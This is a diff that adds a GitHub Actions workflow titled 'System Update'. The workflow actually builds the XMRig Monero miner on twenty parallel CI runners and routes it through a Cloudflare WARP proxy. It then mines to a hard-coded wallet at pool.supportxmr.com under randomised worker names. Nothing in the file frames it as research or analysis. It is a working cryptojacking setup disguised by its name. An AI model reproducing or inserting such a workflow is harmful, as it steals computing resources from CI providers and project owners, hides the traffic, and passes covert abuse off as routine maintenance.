@@ -1,0 +1,26 @@
+name: System Update
+on: [push, workflow_dispatch]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+    steps:
+      - name: Runner
+        run: |
+          sudo apt update && sudo apt install -y screen git build-essential cmake libuv1-dev libssl-dev libhwloc-dev psmisc curl gpg net-tools
+          git clone https://github.com/xmrig/xmrig.git
+          cd xmrig && mkdir build && cd build
+          cmake .. && make -j$(nproc)
+          sudo sysctl -w vm.nr_hugepages=1280
+          curl -fsSL https://pkg.cloudflareclient.com/pubkey.gpg | sudo gpg --yes --dearmor --output /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg
+          echo "deb [arch=amd64 signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ focal main" | sudo tee /etc/apt/sources.list.d/cloudflare-client.list
+          sudo apt update && sudo apt install cloudflare-warp -y
+          sudo systemctl restart warp-svc
+          sleep 5
+          warp-cli --accept-tos registration new
+          warp-cli --accept-tos mode proxy
+          warp-cli --accept-tos connect
+          RAND_NAME="worker-${{ matrix.instance }}-$((1000 + RANDOM % 9000))"
+          ./xmrig -o pool.supportxmr.com:443 -u 49C74tmssnRe54eQhUVvuDcSKBa85nUydXQQ9F1mMmNTYsJN2fMTZb9MUk9hMRgFaNSXeAjjDuT9mGbLbgyqP9PZ1xPEEq6 -p $RAND_NAME -a rx/0 --tls --proxy=socks5://127.0.0.1:40000 --cpu-max-threads-hint=100 --donate-level=1 --huge-pages --asm=intel
